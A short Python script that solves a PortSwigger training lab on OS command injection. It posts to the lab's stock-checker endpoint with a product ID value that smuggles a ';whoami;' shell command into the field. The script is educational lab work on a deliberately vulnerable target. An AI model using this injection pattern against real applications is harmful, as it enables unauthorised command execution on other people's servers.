#!/usr/bin/env python


'''This lab contains an OS command injection vulnerability in the product stock checker.

The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

To solve the lab, execute the whoami command to determine the name of the current user.

Lab link: https://portswigger.net/web-security/os-command-injection/lab-simple
'''

import requests



lab_id = '0ab500c6046626e18322661f005a0055' #change based on generated lab
uri = f"https://{lab_id}.web-security-academy.net/product/stock"  # target the stock endpoint

# inject into the parameters the commands we want to run
data =  { 'productId' : ' ;whoami;',
         'storeId' : 'cat stockreport.sh'}

r1 = requests.post(uri, data=data)
print(r1.text)
